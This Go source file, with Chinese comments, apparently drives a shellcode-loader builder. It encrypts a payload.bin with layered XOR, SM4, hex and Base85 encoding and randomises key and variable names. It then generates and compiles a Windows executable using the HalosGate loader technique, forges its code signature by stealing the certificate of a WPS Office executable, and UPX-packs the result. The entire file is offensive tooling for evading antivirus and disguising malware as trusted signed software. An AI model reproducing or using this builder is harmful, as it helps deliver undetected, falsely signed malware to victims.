package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
	// 定义模板渲染数据
	data := render.Data{
		KeyName:    rand.RStrings(),
		KeyValue:   rand.LStrings(16),
		IvName:     rand.RStrings(),
		IvValue:    rand.LStrings(16),
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Decrypt:    "XorSm4HexBase85Decrypt",
		Loader:     "HalosGate",
	}

	// 设置加密参数
	params := enc.Payload{
		PlainText: "render/templates/payload.bin",
		Key:       []byte(data.KeyValue),
		IV:        []byte(data.IvValue),
	}
	// 加密之后的 shellcode
	tmp, err := params.SignSetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}
	data.Payload = tmp

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = render.TmplRender(tOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: false,
		CompilePath: "output",
	}
	// 编译
	if err = cOpts.Compile(); err != nil {
		log.Fatal(err)
	}

	// 添加图标和文件信息
	err = cOpts.Winres()
	if err != nil {
		log.Fatal(err)
	}

	// 伪造证书配置
	sOpts := build.SignOpts{
		SignPath: "output",
		UnSign:   cOpts.ExeFileName,
		Signed:   "signed_" + cOpts.ExeFileName,
		Cert:     "wps.der",
		Thief:    "wps.exe",
		DstCert:  "wps.der",
	}

	// 保存证书
	err = sOpts.SaveCert()
	if err != nil {
		log.Fatal(err)
	}

	// 利用EXE进行签名伪造
	err = sOpts.ExeThief()
	if err != nil {
		log.Fatal(err)
	}

	// 利用证书进行签名伪造
	//err = sOpts.CertThief()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 压缩参数
	upx := build.UpxOpts{
		Level:   "--lzma",
		Keep:    true,
		Force:   true,
		SrcExe:  cOpts.ExeFileName,
		UpxPath: "output",
	}

	// 压缩
	err = upx.UpxPacker()
	if err != nil {
		log.Warn(err)
	}

}
